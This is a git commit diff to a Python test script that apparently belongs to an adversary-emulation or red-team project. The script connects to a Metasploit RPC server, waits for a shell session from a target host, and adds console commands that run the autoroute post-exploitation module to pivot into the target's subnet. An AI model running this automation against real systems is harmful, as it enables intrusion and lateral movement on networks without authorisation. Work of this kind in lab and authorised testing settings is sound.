d819f71eeb4b2d1fe2d475d0962aa23a157cc55a
jc <jym@jym.sg>
2017-10-17 16:34:54 +0800

    renamed technique

--- test_pymsf.py
+++ test_pymsf.py
@@ -4,11 +4,17 @@ from pymetasploit.msfrpc import MsfRpcClient
 from stage2.external_c2 import msf_wait_for_session, msf_get_timestamp
 
 client = MsfRpcClient(MSF_PWD, server=MSF_SERVER,ssl=False)
-id = msf_wait_for_session.run(client, '192.168.2.129', meterpreter=False)
+id = msf_wait_for_session.run(client, '192.168.181.191', meterpreter=False)
 shell = client.sessions.session(id)
 if(shell is None):
     print("time out, no shell :(")
 else:
     print(msf_get_timestamp.run(client, id))
-    
-pass # for breakpoint
+    console = client.consoles.console()
+    # console != shell think local-attacker vs target access
+    console.write('use post/multi/manage/autoroute')
+    console.write('set NETMASK 255.255.255.0')
+    console.write('set SESSION {0}'.format(id))
+    console.write('set CMD autoadd')
+    console.write('run -j')
+    pass # for breakpoint
